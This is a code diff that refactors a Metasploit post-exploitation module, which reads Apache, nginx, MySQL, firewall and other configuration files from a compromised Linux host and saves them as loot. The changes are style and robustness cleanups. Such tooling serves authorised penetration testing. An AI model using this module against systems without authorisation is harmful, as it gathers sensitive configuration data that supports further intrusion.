@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::Linux::System
 
-  def initialize(info={})
+  def initialize(info = {})
     super( update_info( info,
       'Name'          => 'Linux Gather Configurations',
       'Description'   => %q{
@@ -27,36 +27,25 @@ class MetasploitModule < Msf::Post
 
   def run
     distro = get_sysinfo
-    h = get_host
-    print_status("Running module against #{h}")
-    print_status("Info:")
-    print_status("\t#{distro[:version]}")
-    print_status("\t#{distro[:kernel]}")
 
-    vprint_status("Finding configuration files...")
+    print_status "Running module against #{session.session_host} [#{get_hostname}]"
+    print_status 'Info:'
+    print_status "\t#{distro[:version]}"
+    print_status "\t#{distro[:kernel]}"
+
+    vprint_status 'Finding configuration files...'
     find_configs
   end
 
-  def save(file, data, ctype="text/plain")
-    ltype = "linux.enum.conf"
+  def save(file, data, ctype='text/plain')
+    ltype = 'linux.enum.conf'
     fname = ::File.basename(file)
     loot = store_loot(ltype, ctype, session, data, fname)
-    print_good("#{fname} stored in #{loot.to_s}")
-  end
-
-  def get_host
-    case session.type
-    when /meterpreter/
-      host = sysinfo["Computer"]
-    when /shell/
-      host = cmd_exec("hostname").chomp
-    end
-
-    return host
+    print_good("#{fname} stored in #{loot}")
   end
 
   def find_configs
-    configs =[
+    configs = [
       "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
       "/etc/snort/snort.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf",
       "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
@@ -70,8 +59,10 @@ class MetasploitModule < Msf::Post
     ]
 
     configs.each do |f|
-      output = read_file("#{f}")
-      save(f,  output) if output && output !~ /No such file or directory/
+      output = read_file(f).to_s
+      next if output.strip.length == 0
+      next if output =~ /No such file or directory/
+      save(f, output)
     end
   end
 end
